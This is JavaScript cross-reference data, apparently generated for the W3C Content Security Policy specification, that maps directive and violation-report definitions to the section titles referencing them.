        window.dfnpanelData['header-content-security-policy'] = { "dfnID": "header-content-security-policy", "url": "#header-content-security-policy", "dfnText": "Content-Security-Policy", "refSections": [{ "refs": [{ "id": "ref-for-header-content-security-policy" }], "title": "1.1.1. Control Execution" }, { "refs": [{ "id": "ref-for-header-content-security-policy\u2460" }], "title": "3.1. \n    The Content-Security-Policy HTTP Response Header Field\n  " }, { "refs": [{ "id": "ref-for-header-content-security-policy\u2461" }], "title": "6.1.1. child-src" }, { "refs": [{ "id": "ref-for-header-content-security-policy\u2462" }], "title": "6.1.2. connect-src" }, { "refs": [{ "id": "ref-for-header-content-security-policy\u2463" }, { "id": "ref-for-header-content-security-policy\u2464" }, { "id": "ref-for-header-content-security-policy\u2465" }, { "id": "ref-for-header-content-security-policy\u2466" }], "title": "6.1.3. default-src" }, { "refs": [{ "id": "ref-for-header-content-security-policy\u2467" }], "title": "6.1.4. font-src" }, { "refs": [{ "id": "ref-for-header-content-security-policy\u2468" }], "title": "6.1.5. frame-src" }, { "refs": [{ "id": "ref-for-header-content-security-policy\u2460\u24ea" }], "title": "6.1.6. img-src" }, { "refs": [{ "id": "ref-for-header-content-security-policy\u2460\u2460" }], "title": "6.1.7. manifest-src" }, { "refs": [{ "id": "ref-for-header-content-security-policy\u2460\u2461" }], "title": "6.1.8. media-src" }, { "refs": [{ "id": "ref-for-header-content-security-policy\u2460\u2462" }], "title": "6.1.9. object-src" }, { "refs": [{ "id": "ref-for-header-content-security-policy\u2460\u2463" }], "title": "6.2.2. worker-src" }, { "refs": [{ "id": "ref-for-header-content-security-policy\u2460\u2464" }], "title": "6.5.1. report-uri" }, { "refs": [{ "id": "ref-for-header-content-security-policy\u2460\u2465" }, { "id": "ref-for-header-content-security-policy\u2460\u2466" }], "title": "8.1. \n    The effect of multiple policies\n  " }, { "refs": [{ "id": "ref-for-header-content-security-policy\u2460\u2467" }], "title": "8.2. \n    Usage of \"'strict-dynamic'\"\n  " }, { "refs": [{ "id": "ref-for-header-content-security-policy\u2460\u2468" }], "title": "8.3. \n      Usage of \"'unsafe-hashes'\"\n    " }, { "refs": [{ "id": "ref-for-header-content-security-policy\u2461\u24ea" }], "title": "8.4. \n      Allowing external JavaScript via hashes\n    " }, { "refs": [{ "id": "ref-for-header-content-security-policy\u2461\u2460" }, { "id": "ref-for-header-content-security-policy\u2461\u2461" }], "title": "8.5. \n      Strict CSP\n    " }, { "refs": [{ "id": "ref-for-header-content-security-policy\u2461\u2462" }, { "id": "ref-for-header-content-security-policy\u2461\u2463" }], "title": "8.6. \n      Exfiltration\n    " }], "external": false };
        window.dfnpanelData['header-content-security-policy-report-only'] = { "dfnID": "header-content-security-policy-report-only", "url": "#header-content-security-policy-report-only", "dfnText": "Content-Security-Policy-Report-Only", "refSections": [{ "refs": [{ "id": "ref-for-header-content-security-policy-report-only" }, { "id": "ref-for-header-content-security-policy-report-only\u2460" }], "title": "3.2. \n    The Content-Security-Policy-Report-Only HTTP Response Header Field\n  " }, { "refs": [{ "id": "ref-for-header-content-security-policy-report-only\u2461" }], "title": "3.3. \n    The <meta> element\n  " }, { "refs": [{ "id": "ref-for-header-content-security-policy-report-only\u2462" }], "title": "6.3.2. sandbox" }], "external": false };
        window.dfnpanelData['report-for-request'] = { "dfnID": "report-for-request", "url": "#report-for-request", "dfnText": "4.1.1. \n    Report Content Security Policy violations for request\n  ", "refSections": [{ "refs": [{ "id": "ref-for-report-for-request" }], "title": "4.1.1. \n    Report Content Security Policy violations for request\n  " }], "external": false };
        window.dfnpanelData['should-block-request'] = { "dfnID": "should-block-request", "url": "#should-block-request", "dfnText": "4.1.2. \n    Should request be blocked by Content Security Policy?\n  ", "refSections": [{ "refs": [{ "id": "ref-for-should-block-request" }], "title": "2.3. Directives" }, { "refs": [{ "id": "ref-for-should-block-request" }], "title": "4.1. \n    Integration with Fetch\n  " }, { "refs": [{ "id": "ref-for-should-block-request" }], "title": "4.1.2. \n    Should request be blocked by Content Security Policy?\n  " }, { "refs": [{ "id": "ref-for-should-block-request" }], "title": "6.1.3. default-src" }, { "refs": [{ "id": "ref-for-should-block-request" }], "title": "6.1.10. script-src" }, { "refs": [{ "id": "ref-for-should-block-request" }], "title": "6.1.13. style-src" }], "external": false };
        window.dfnpanelData['should-block-response'] = { "dfnID": "should-block-response", "url": "#should-block-response", "dfnText": "4.1.3. \n    Should response to request be blocked by Content Security Policy?\n  ", "refSections": [{ "refs": [{ "id": "ref-for-should-block-response" }], "title": "2.3. Directives" }, { "refs": [{ "id": "ref-for-should-block-response" }], "title": "4.1. \n    Integration with Fetch\n  " }, { "refs": [{ "id": "ref-for-should-block-response" }], "title": "4.1.3. \n    Should response to request be blocked by Content Security Policy?\n  " }, { "refs": [{ "id": "ref-for-should-block-response" }], "title": "6.1.3. default-src" }, { "refs": [{ "id": "ref-for-should-block-response" }], "title": "6.1.10. script-src" }, { "refs": [{ "id": "ref-for-should-block-response" }], "title": "6.1.13. style-src" }], "external": false };
        window.dfnpanelData['global-object-csp-list'] = { "dfnID": "global-object-csp-list", "url": "#global-object-csp-list", "dfnText": "CSP list", "refSections": [{ "refs": [{ "id": "ref-for-global-object-csp-list" }], "title": "4.2. \n    Integration with HTML\n  " }, { "refs": [{ "id": "ref-for-global-object-csp-list\u2460" }, { "id": "ref-for-global-object-csp-list\u2461" }], "title": "4.2.2. \n    Retrieve the CSP list of an object\n  " }, { "refs": [{ "id": "ref-for-global-object-csp-list\u2462" }], "title": "4.2.3. \n    Should element\u2019s inline type behavior be blocked by Content Security Policy?\n  " }, { "refs": [{ "id": "ref-for-global-object-csp-list\u2463" }], "title": "4.2.4. \n    Should navigation request of type be blocked\n    by Content Security Policy?\n  " }, { "refs": [{ "id": "ref-for-global-object-csp-list\u2464" }], "title": "4.2.6. \n    Run CSP initialization for a global object\n  " }, { "refs": [{ "id": "ref-for-global-object-csp-list\u2465" }], "title": "4.3.1. \n    Should RTC connections be blocked for global?\n  " }, { "refs": [{ "id": "ref-for-global-object-csp-list\u2466" }], "title": "4.4. Integration with ECMAScript" }, { "refs": [{ "id": "ref-for-global-object-csp-list\u2467" }], "title": "4.4.1. \n    EnsureCSPDoesNotBlockStringCompilation(realm, parameterStrings, bodyString, codeString, compilationType, parameterArgs, bodyArg)\n  " }, { "refs": [{ "id": "ref-for-global-object-csp-list\u2468" }], "title": "4.5. Integration with WebAssembly" }, { "refs": [{ "id": "ref-for-global-object-csp-list\u2460\u24ea" }], "title": "4.5.1. \n  EnsureCSPDoesNotBlockWasmByteCompilationrealm\n" }, { "refs": [{ "id": "ref-for-global-object-csp-list\u2460\u2460" }], "title": "6.3.1.1. \n    Is base allowed for document?\n  " }, { "refs": [{ "id": "ref-for-global-object-csp-list\u2460\u2461" }, { "id": "ref-for-global-object-csp-list\u2460\u2462" }, { "id": "ref-for-global-object-csp-list\u2460\u2463" }, { "id": "ref-for-global-object-csp-list\u2460\u2464" }], "title": "7.8. \n    CSP Inheriting to avoid bypasses\n  " }], "external": false };
        window.dfnpanelData['enforced'] = { "dfnID": "enforced", "url": "#enforced", "dfnText": "enforced", "refSections": [{ "refs": [{ "id": "ref-for-enforced" }], "title": "3.1. \n    The Content-Security-Policy HTTP Response Header Field\n  " }, { "refs": [{ "id": "ref-for-enforced\u2460" }], "title": "4.2. \n    Integration with HTML\n  " }], "external": false };
        window.dfnpanelData['monitored'] = { "dfnID": "monitored", "url": "#monitored", "dfnText": "monitored", "refSections": [{ "refs": [{ "id": "ref-for-monitored" }], "title": "3.2. \n    The Content-Security-Policy-Report-Only HTTP Response Header Field\n  " }], "external": false };
        window.dfnpanelData['run-document-csp-initialization'] = { "dfnID": "run-document-csp-initialization", "url": "#run-document-csp-initialization", "dfnText": "4.2.1. \n    Run CSP initialization for a Document\n  ", "refSections": [{ "refs": [{ "id": "ref-for-run-document-csp-initialization" }], "title": "2.3. Directives" }, { "refs": [{ "id": "ref-for-run-document-csp-initialization" }], "title": "4.2. \n    Integration with HTML\n  " }, { "refs": [{ "id": "ref-for-run-document-csp-initialization" }], "title": "4.2.1. \n    Run CSP initialization for a Document\n  " }], "external": false };
        window.dfnpanelData['should-block-inline'] = { "dfnID": "should-block-inline", "url": "#should-block-inline", "dfnText": "4.2.3. \n    Should element\u2019s inline type behavior be blocked by Content Security Policy?\n  ", "refSections": [{ "refs": [{ "id": "ref-for-should-block-inline" }], "title": "2.3. Directives" }, { "refs": [{ "id": "ref-for-should-block-inline" }, { "id": "ref-for-should-block-inline" }], "title": "4.2. \n    Integration with HTML\n  " }, { "refs": [{ "id": "ref-for-should-block-inline" }], "title": "4.2.3. \n    Should element\u2019s inline type behavior be blocked by Content Security Policy?\n  " }, { "refs": [{ "id": "ref-for-should-block-inline" }, { "id": "ref-for-should-block-inline" }], "title": "6.1.10. script-src" }, { "refs": [{ "id": "ref-for-should-block-inline" }], "title": "6.1.13. style-src" }], "external": false };
        window.dfnpanelData['should-block-navigation-request'] = { "dfnID": "should-block-navigation-request", "url": "#should-block-navigation-request", "dfnText": "4.2.4. \n    Should navigation request of type be blocked\n    by Content Security Policy?\n  ", "refSections": [{ "refs": [{ "id": "ref-for-should-block-navigation-request" }, { "id": "ref-for-should-block-navigation-request" }], "title": "2.3. Directives" }, { "refs": [{ "id": "ref-for-should-block-navigation-request" }], "title": "4.2. \n    Integration with HTML\n  " }, { "refs": [{ "id": "ref-for-should-block-navigation-request" }], "title": "4.2.4. \n    Should navigation request of type be blocked\n    by Content Security Policy?\n  " }], "external": false };
        window.dfnpanelData['should-block-navigation-response'] = { "dfnID": "should-block-navigation-response", "url": "#should-block-navigation-response", "dfnText": "4.2.5. \n    Should navigation response to navigation request of type\n    in target be blocked by Content Security Policy?\n  ", "refSections": [{ "refs": [{ "id": "ref-for-should-block-navigation-response" }], "title": "2.3. Directives" }, { "refs": [{ "id": "ref-for-should-block-navigation-response" }], "title": "4.2. \n    Integration with HTML\n  " }, { "refs": [{ "id": "ref-for-should-block-navigation-response" }], "title": "4.2.5. \n    Should navigation response to navigation request of type\n    in target be blocked by Content Security Policy?\n  " }], "external": false };
        window.dfnpanelData['run-global-object-csp-initialization'] = { "dfnID": "run-global-object-csp-initialization", "url": "#run-global-object-csp-initialization", "dfnText": "4.2.6. \n    Run CSP initialization for a global object\n  ", "refSections": [{ "refs": [{ "id": "ref-for-run-global-object-csp-initialization" }], "title": "2.3. Directives" }, { "refs": [{ "id": "ref-for-run-global-object-csp-initialization" }], "title": "4.2. \n    Integration with HTML\n  " }, { "refs": [{ "id": "ref-for-run-global-object-csp-initialization" }], "title": "4.2.6. \n    Run CSP initialization for a global object\n  " }], "external": false };
        window.dfnpanelData['can-compile-strings'] = { "dfnID": "can-compile-strings", "url": "#can-compile-strings", "dfnText": "4.4.1. \n    EnsureCSPDoesNotBlockStringCompilation(realm, parameterStrings, bodyString, codeString, compilationType, parameterArgs, bodyArg)\n  ", "refSections": [{ "refs": [{ "id": "ref-for-can-compile-strings" }], "title": "4.4.1. \n    EnsureCSPDoesNotBlockStringCompilation(realm, parameterStrings, bodyString, codeString, compilationType, parameterArgs, bodyArg)\n  " }], "external": false };
        window.dfnpanelData['can-compile-wasm-bytes'] = { "dfnID": "can-compile-wasm-bytes", "url": "#can-compile-wasm-bytes", "dfnText": "4.5.1. \n  EnsureCSPDoesNotBlockWasmByteCompilationrealm\n", "refSections": [{ "refs": [{ "id": "ref-for-can-compile-wasm-bytes" }], "title": "4.5.1. \n  EnsureCSPDoesNotBlockWasmByteCompilationrealm\n" }], "external": false };
        window.dfnpanelData['csp-violation-report'] = { "dfnID": "csp-violation-report", "url": "#csp-violation-report", "dfnText": "csp violation report", "refSections": [{ "refs": [{ "id": "ref-for-csp-violation-report" }, { "id": "ref-for-csp-violation-report\u2460" }], "title": "5. \n    Reporting\n  " }, { "refs": [{ "id": "ref-for-csp-violation-report\u2461" }], "title": "6.5.1. report-uri" }], "external": false };
        window.dfnpanelData['cspviolationreportbody'] = { "dfnID": "cspviolationreportbody", "url": "#cspviolationreportbody", "dfnText": "CSPViolationReportBody", "refSections": [{ "refs": [{ "id": "ref-for-cspviolationreportbody" }], "title": "5.5. \n    Report a violation\n  " }], "external": false };
        window.dfnpanelData['dom-cspviolationreportbody-documenturl'] = { "dfnID": "dom-cspviolationreportbody-documenturl", "url": "#dom-cspviolationreportbody-documenturl", "dfnText": "documentURL", "refSections": [{ "refs": [{ "id": "ref-for-dom-cspviolationreportbody-documenturl" }], "title": "5.5. \n    Report a violation\n  " }], "external": false };
        window.dfnpanelData['dom-cspviolationreportbody-referrer'] = { "dfnID": "dom-cspviolationreportbody-referrer", "url": "#dom-cspviolationreportbody-referrer", "dfnText": "referrer", "refSections": [{ "refs": [{ "id": "ref-for-dom-cspviolationreportbody-referrer" }], "title": "5.5. \n    Report a violation\n  " }], "external": false };
        window.dfnpanelData['dom-cspviolationreportbody-blockedurl'] = { "dfnID": "dom-cspviolationreportbody-blockedurl", "url": "#dom-cspviolationreportbody-blockedurl", "dfnText": "blockedURL", "refSections": [{ "refs": [{ "id": "ref-for-dom-cspviolationreportbody-blockedurl" }], "title": "5.5. \n    Report a violation\n  " }], "external": false };
        window.dfnpanelData['dom-cspviolationreportbody-effectivedirective'] = { "dfnID": "dom-cspviolationreportbody-effectivedirective", "url": "#dom-cspviolationreportbody-effectivedirective", "dfnText": "effectiveDirective", "refSections": [{ "refs": [{ "id": "ref-for-dom-cspviolationreportbody-effectivedirective" }], "title": "5.5. \n    Report a violation\n  " }], "external": false };
        window.dfnpanelData['dom-cspviolationreportbody-originalpolicy'] = { "dfnID": "dom-cspviolationreportbody-originalpolicy", "url": "#dom-cspviolationreportbody-originalpolicy", "dfnText": "originalPolicy", "refSections": [{ "refs": [{ "id": "ref-for-dom-cspviolationreportbody-originalpolicy" }], "title": "5.5. \n    Report a violation\n  " }], "external": false };
        window.dfnpanelData['dom-cspviolationreportbody-sourcefile'] = { "dfnID": "dom-cspviolationreportbody-sourcefile", "url": "#dom-cspviolationreportbody-sourcefile", "dfnText": "sourceFile", "refSections": [{ "refs": [{ "id": "ref-for-dom-cspviolationreportbody-sourcefile" }], "title": "5.5. \n    Report a violation\n  " }], "external": false };
        window.dfnpanelData['dom-cspviolationreportbody-sample'] = { "dfnID": "dom-cspviolationreportbody-sample", "url": "#dom-cspviolationreportbody-sample", "dfnText": "sample", "refSections": [{ "refs": [{ "id": "ref-for-dom-cspviolationreportbody-sample" }], "title": "5.5. \n    Report a violation\n  " }], "external": false };
        window.dfnpanelData['dom-cspviolationreportbody-disposition'] = { "dfnID": "dom-cspviolationreportbody-disposition", "url": "#dom-cspviolationreportbody-disposition", "dfnText": "disposition", "refSections": [{ "refs": [{ "id": "ref-for-dom-cspviolationreportbody-disposition" }], "title": "5.5. \n    Report a violation\n  " }], "external": false };
        window.dfnpanelData['dom-cspviolationreportbody-statuscode'] = { "dfnID": "dom-cspviolationreportbody-statuscode", "url": "#dom-cspviolationreportbody-statuscode", "dfnText": "statusCode", "refSections": [{ "refs": [{ "id": "ref-for-dom-cspviolationreportbody-statuscode" }], "title": "5.5. \n    Report a violation\n  " }], "external": false };
        window.dfnpanelData['dom-cspviolationreportbody-linenumber'] = { "dfnID": "dom-cspviolationreportbody-linenumber", "url": "#dom-cspviolationreportbody-linenumber", "dfnText": "lineNumber", "refSections": [{ "refs": [{ "id": "ref-for-dom-cspviolationreportbody-linenumber" }], "title": "5.5. \n    Report a violation\n  " }], "external": false };
        window.dfnpanelData['dom-cspviolationreportbody-columnnumber'] = { "dfnID": "dom-cspviolationreportbody-columnnumber", "url": "#dom-cspviolationreportbody-columnnumber", "dfnText": "columnNumber", "refSections": [{ "refs": [{ "id": "ref-for-dom-cspviolationreportbody-columnnumber" }], "title": "5.5. \n    Report a violation\n  " }], "external": false };
        window.dfnpanelData['enumdef-securitypolicyviolationeventdisposition'] = { "dfnID": "enumdef-securitypolicyviolationeventdisposition", "url": "#enumdef-securitypolicyviolationeventdisposition", "dfnText": "SecurityPolicyViolationEventDisposition", "refSections": [{ "refs": [{ "id": "ref-for-enumdef-securitypolicyviolationeventdisposition" }], "title": "5. \n    Reporting\n  " }, { "refs": [{ "id": "ref-for-enumdef-securitypolicyviolationeventdisposition\u2460" }, { "id": "ref-for-enumdef-securitypolicyviolationeventdisposition\u2461" }], "title": "5.1. \n    Violation DOM Events\n  " }], "external": false };
        window.dfnpanelData['securitypolicyviolationevent'] = { "dfnID": "securitypolicyviolationevent", "url": "#securitypolicyviolationevent", "dfnText": "SecurityPolicyViolationEvent", "refSections": [{ "refs": [{ "id": "ref-for-securitypolicyviolationevent" }], "title": "5.3. \n    Obtain the deprecated serialization of violation\n  " }, { "refs": [{ "id": "ref-for-securitypolicyviolationevent\u2460" }, { "id": "ref-for-securitypolicyviolationevent\u2461" }], "title": "5.5. \n    Report a violation\n  " }, { "refs": [{ "id": "ref-for-securitypolicyviolationevent\u2462" }], "title": "7.5. Violation Reports" }], "external": false };
        window.dfnpanelData['dom-securitypolicyviolationevent-documenturi'] = { "dfnID": "dom-securitypolicyviolationevent-documenturi", "url": "#dom-securitypolicyviolationevent-documenturi", "dfnText": "documentURI", "refSections": [{ "refs": [{ "id": "ref-for-dom-securitypolicyviolationevent-documenturi" }], "title": "5.5. \n    Report a violation\n  " }], "external": false };
        window.dfnpanelData['dom-securitypolicyviolationevent-referrer'] = { "dfnID": "dom-securitypolicyviolationevent-referrer", "url": "#dom-securitypolicyviolationevent-referrer", "dfnText": "referrer", "refSections": [{ "refs": [{ "id": "ref-for-dom-securitypolicyviolationevent-referrer" }], "title": "5.5. \n    Report a violation\n  " }], "external": false };
        window.dfnpanelData['dom-securitypolicyviolationevent-blockeduri'] = { "dfnID": "dom-securitypolicyviolationevent-blockeduri", "url": "#dom-securitypolicyviolationevent-blockeduri", "dfnText": "blockedURI", "refSections": [{ "refs": [{ "id": "ref-for-dom-securitypolicyviolationevent-blockeduri" }], "title": "5.2. \n    Obtain the blockedURI of a violation\u2019s resource\n  " }, { "refs": [{ "id": "ref-for-dom-securitypolicyviolationevent-blockeduri\u2460" }], "title": "5.5. \n    Report a violation\n  " }], "external": false };
        window.dfnpanelData['dom-securitypolicyviolationevent-effectivedirective'] = { "dfnID": "dom-securitypolicyviolationevent-effectivedirective", "url": "#dom-securitypolicyviolationevent-effectivedirective", "dfnText": "effectiveDirective", "refSections": [{ "refs": [{ "id": "ref-for-dom-securitypolicyviolationevent-effectivedirective" }, { "id": "ref-for-dom-securitypolicyviolationevent-effectivedirective\u2460" }], "title": "5.5. \n    Report a violation\n  " }], "external": false };
        window.dfnpanelData['dom-securitypolicyviolationevent-violateddirective'] = { "dfnID": "dom-securitypolicyviolationevent-violateddirective", "url": "#dom-securitypolicyviolationevent-violateddirective", "dfnText": "violatedDirective", "refSections": [{ "refs": [{ "id": "ref-for-dom-securitypolicyviolationevent-violateddirective" }, { "id": "ref-for-dom-securitypolicyviolationevent-violateddirective\u2460" }], "title": "5.5. \n    Report a violation\n  " }], "external": false };
        window.dfnpanelData['dom-securitypolicyviolationevent-originalpolicy'] = { "dfnID": "dom-securitypolicyviolationevent-originalpolicy", "url": "#dom-securitypolicyviolationevent-originalpolicy", "dfnText": "originalPolicy", "refSections": [{ "refs": [{ "id": "ref-for-dom-securitypolicyviolationevent-originalpolicy" }], "title": "5.5. \n    Report a violation\n  " }], "external": false };
        window.dfnpanelData['dom-securitypolicyviolationevent-sourcefile'] = { "dfnID": "dom-securitypolicyviolationevent-sourcefile", "url": "#dom-securitypolicyviolationevent-sourcefile", "dfnText": "sourceFile", "refSections": [{ "refs": [{ "id": "ref-for-dom-securitypolicyviolationevent-sourcefile" }], "title": "5.5. \n    Report a violation\n  " }], "external": false };
        window.dfnpanelData['dom-securitypolicyviolationevent-sample'] = { "dfnID": "dom-securitypolicyviolationevent-sample", "url": "#dom-securitypolicyviolationevent-sample", "dfnText": "sample", "refSections": [{ "refs": [{ "id": "ref-for-dom-securitypolicyviolationevent-sample" }], "title": "5.3. \n    Obtain the deprecated serialization of violation\n  " }, { "refs": [{ "id": "ref-for-dom-securitypolicyviolationevent-sample\u2460" }], "title": "5.5. \n    Report a violation\n  " }, { "refs": [{ "id": "ref-for-dom-securitypolicyviolationevent-sample\u2461" }], "title": "7.5. Violation Reports" }], "external": false };
        window.dfnpanelData['dom-securitypolicyviolationevent-disposition'] = { "dfnID": "dom-securitypolicyviolationevent-disposition", "url": "#dom-securitypolicyviolationevent-disposition", "dfnText": "disposition", "refSections": [{ "refs": [{ "id": "ref-for-dom-securitypolicyviolationevent-disposition" }], "title": "5.5. \n    Report a violation\n  " }], "external": false };
        window.dfnpanelData['dom-securitypolicyviolationevent-statuscode'] = { "dfnID": "dom-securitypolicyviolationevent-statuscode", "url": "#dom-securitypolicyviolationevent-statuscode", "dfnText": "statusCode", "refSections": [{ "refs": [{ "id": "ref-for-dom-securitypolicyviolationevent-statuscode" }], "title": "5.5. \n    Report a violation\n  " }], "external": false };
        window.dfnpanelData['dom-securitypolicyviolationevent-linenumber'] = { "dfnID": "dom-securitypolicyviolationevent-linenumber", "url": "#dom-securitypolicyviolationevent-linenumber", "dfnText": "lineNumber", "refSections": [{ "refs": [{ "id": "ref-for-dom-securitypolicyviolationevent-linenumber" }], "title": "5.5. \n    Report a violation\n  " }], "external": false };
        window.dfnpanelData['dom-securitypolicyviolationevent-columnnumber'] = { "dfnID": "dom-securitypolicyviolationevent-columnnumber", "url": "#dom-securitypolicyviolationevent-columnnumber", "dfnText": "columnNumber", "refSections": [{ "refs": [{ "id": "ref-for-dom-securitypolicyviolationevent-columnnumber" }], "title": "5.5. \n    Report a violation\n  " }], "external": false };
        window.dfnpanelData['dictdef-securitypolicyviolationeventinit'] = { "dfnID": "dictdef-securitypolicyviolationeventinit", "url": "#dictdef-securitypolicyviolationeventinit", "dfnText": "SecurityPolicyViolationEventInit", "refSections": [{ "refs": [{ "id": "ref-for-dictdef-securitypolicyviolationeventinit" }], "title": "5.1. \n    Violation DOM Events\n  " }], "external": false };
        window.dfnpanelData['fetch-directives'] = { "dfnID": "fetch-directives", "url": "#fetch-directives", "dfnText": "Fetch directives", "refSections": [{ "refs": [{ "id": "ref-for-fetch-directives" }, { "id": "ref-for-fetch-directives\u2460" }, { "id": "ref-for-fetch-directives\u2461" }], "title": "6.1.3. default-src" }, { "refs": [{ "id": "ref-for-fetch-directives\u2462" }], "title": "6.8.1. \n    Get the effective directive for request\n  " }, { "refs": [{ "id": "ref-for-fetch-directives\u2463" }], "title": "6.8.4. \n    Should fetch directive execute\n  " }], "external": false };
        window.dfnpanelData['child-src'] = { "dfnID": "child-src", "url": "#child-src", "dfnText": "child-src", "refSections": [{ "refs": [{ "id": "ref-for-child-src" }], "title": "6.1.1. child-src" }, { "refs": [{ "id": "ref-for-child-src\u2460" }], "title": "10.1. \n    Directive Registry\n  " }], "external": false };
        window.dfnpanelData['connect-src'] = { "dfnID": "connect-src", "url": "#connect-src", "dfnText": "connect-src", "refSections": [{ "refs": [{ "id": "ref-for-connect-src" }], "title": "6.1.2. connect-src" }, { "refs": [{ "id": "ref-for-connect-src\u2460" }, { "id": "ref-for-connect-src\u2461" }], "title": "6.1.3. default-src" }, { "refs": [{ "id": "ref-for-connect-src\u2462" }], "title": "10.1. \n    Directive Registry\n  " }], "external": false };
        window.dfnpanelData['default-src'] = { "dfnID": "default-src", "url": "#default-src", "dfnText": "default-src", "refSections": [{ "refs": [{ "id": "ref-for-default-src" }], "title": "6. \n    Content Security Policy Directives\n  " }, { "refs": [{ "id": "ref-for-default-src\u2460" }, { "id": "ref-for-default-src\u2461" }, { "id": "ref-for-default-src\u2462" }, { "id": "ref-for-default-src\u2463" }], "title": "6.1.3. default-src" }, { "refs": [{ "id": "ref-for-default-src\u2464" }], "title": "8.2. \n    Usage of \"'strict-dynamic'\"\n  " }, { "refs": [{ "id": "ref-for-default-src\u2465" }, { "id": "ref-for-default-src\u2466" }], "title": "8.6. \n      Exfiltration\n    " }, { "refs": [{ "id": "ref-for-default-src\u2467" }], "title": "10.1. \n    Directive Registry\n  " }], "external": false };
        window.dfnpanelData['font-src'] = { "dfnID": "font-src", "url": "#font-src", "dfnText": "font-src", "refSections": [{ "refs": [{ "id": "ref-for-font-src" }], "title": "6.1. \n    Fetch Directives\n  " }, { "refs": [{ "id": "ref-for-font-src\u2460" }, { "id": "ref-for-font-src\u2461" }], "title": "6.1.3. default-src" }, { "refs": [{ "id": "ref-for-font-src\u2462" }], "title": "6.1.4. font-src" }, { "refs": [{ "id": "ref-for-font-src\u2463" }], "title": "10.1. \n    Directive Registry\n  " }], "external": false };
        window.dfnpanelData['frame-src'] = { "dfnID": "frame-src", "url": "#frame-src", "dfnText": "frame-src", "refSections": [{ "refs": [{ "id": "ref-for-frame-src" }, { "id": "ref-for-frame-src\u2460" }], "title": "6.1.3. default-src" }, { "refs": [{ "id": "ref-for-frame-src\u2461" }], "title": "6.1.5. frame-src" }, { "refs": [{ "id": "ref-for-frame-src\u2462" }], "title": "10.1. \n    Directive Registry\n  " }], "external": false };
        window.dfnpanelData['img-src'] = { "dfnID": "img-src", "url": "#img-src", "dfnText": "img-src", "refSections": [{ "refs": [{ "id": "ref-for-img-src" }, { "id": "ref-for-img-src\u2460" }], "title": "6.1.3. default-src" }, { "refs": [{ "id": "ref-for-img-src\u2461" }], "title": "6.1.6. img-src" }, { "refs": [{ "id": "ref-for-img-src\u2462" }], "title": "7.6. Paths and Redirects" }, { "refs": [{ "id": "ref-for-img-src\u2463" }], "title": "8.6. \n      Exfiltration\n    " }, { "refs": [{ "id": "ref-for-img-src\u2464" }], "title": "10.1. \n    Directive Registry\n  " }], "external": false };
        window.dfnpanelData['manifest-src'] = { "dfnID": "manifest-src", "url": "#manifest-src", "dfnText": "manifest-src", "refSections": [{ "refs": [{ "id": "ref-for-manifest-src" }, { "id": "ref-for-manifest-src\u2460" }], "title": "6.1.3. default-src" }, { "refs": [{ "id": "ref-for-manifest-src\u2461" }], "title": "6.1.7. manifest-src" }, { "refs": [{ "id": "ref-for-manifest-src\u2462" }], "title": "10.1. \n    Directive Registry\n  " }], "external": false };
        window.dfnpanelData['media-src'] = { "dfnID": "media-src", "url": "#media-src", "dfnText": "media-src", "refSections": [{ "refs": [{ "id": "ref-for-media-src" }, { "id": "ref-for-media-src\u2460" }], "title": "6.1.3. default-src" }, { "refs": [{ "id": "ref-for-media-src\u2461" }], "title": "6.1.8. media-src" }, { "refs": [{ "id": "ref-for-media-src\u2462" }], "title": "10.1. \n    Directive Registry\n  " }], "external": false };
        window.dfnpanelData['object-src'] = { "dfnID": "object-src", "url": "#object-src", "dfnText": "object-src", "refSections": [{ "refs": [{ "id": "ref-for-object-src" }], "title": "6. \n    Content Security Policy Directives\n  " }, { "refs": [{ "id": "ref-for-object-src\u2460" }, { "id": "ref-for-object-src\u2461" }], "title": "6.1.3. default-src" }, { "refs": [{ "id": "ref-for-object-src\u2462" }], "title": "6.1.9. object-src" }, { "refs": [{ "id": "ref-for-object-src\u2463" }], "title": "10.1. \n    Directive Registry\n  " }], "external": false };
        window.dfnpanelData['script-src'] = { "dfnID": "script-src", "url": "#script-src", "dfnText": "script-src", "refSections": [{ "refs": [{ "id": "ref-for-script-src" }], "title": "6. \n    Content Security Policy Directives\n  " }, { "refs": [{ "id": "ref-for-script-src\u2460" }], "title": "6.1. \n    Fetch Directives\n  " }, { "refs": [{ "id": "ref-for-script-src\u2461" }, { "id": "ref-for-script-src\u2462" }], "title": "8.2. \n    Usage of \"'strict-dynamic'\"\n  " }, { "refs": [{ "id": "ref-for-script-src\u2463" }], "title": "8.3. \n      Usage of \"'unsafe-hashes'\"\n    " }, { "refs": [{ "id": "ref-for-script-src\u2464" }], "title": "10.1. \n    Directive Registry\n  " }], "external": false };
        window.dfnpanelData['script-src-elem'] = { "dfnID": "script-src-elem", "url": "#script-src-elem", "dfnText": "script-src-elem", "refSections": [{ "refs": [{ "id": "ref-for-script-src-elem" }, { "id": "ref-for-script-src-elem\u2460" }, { "id": "ref-for-script-src-elem\u2461" }], "title": "6.1.3. default-src" }, { "refs": [{ "id": "ref-for-script-src-elem\u2462" }, { "id": "ref-for-script-src-elem\u2463" }], "title": "6.1.10. script-src" }, { "refs": [{ "id": "ref-for-script-src-elem\u2464" }], "title": "10.1. \n    Directive Registry\n  " }], "external": false };
        window.dfnpanelData['script-src-attr'] = { "dfnID": "script-src-attr", "url": "#script-src-attr", "dfnText": "script-src-attr", "refSections": [{ "refs": [{ "id": "ref-for-script-src-attr" }, { "id": "ref-for-script-src-attr\u2460" }], "title": "6.1.3. default-src" }, { "refs": [{ "id": "ref-for-script-src-attr\u2461" }, { "id": "ref-for-script-src-attr\u2462" }], "title": "6.1.10. script-src" }, { "refs": [{ "id": "ref-for-script-src-attr\u2463" }], "title": "6.1.11. script-src-elem" }, { "refs": [{ "id": "ref-for-script-src-attr\u2464" }], "title": "10.1. \n    Directive Registry\n  " }], "external": false };
        window.dfnpanelData['style-src'] = { "dfnID": "style-src", "url": "#style-src", "dfnText": "style-src", "refSections": [{ "refs": [{ "id": "ref-for-style-src" }], "title": "7.4. CSS Parsing" }, { "refs": [{ "id": "ref-for-style-src\u2460" }], "title": "10.1. \n    Directive Registry\n  " }], "external": false };
        window.dfnpanelData['style-src-elem'] = { "dfnID": "style-src-elem", "url": "#style-src-elem", "dfnText": "style-src-elem", "refSections": [{ "refs": [{ "id": "ref-for-style-src-elem" }, { "id": "ref-for-style-src-elem\u2460" }], "title": "6.1.3. default-src" }, { "refs": [{ "id": "ref-for-style-src-elem\u2461" }], "title": "10.1. \n    Directive Registry\n  " }], "external": false };
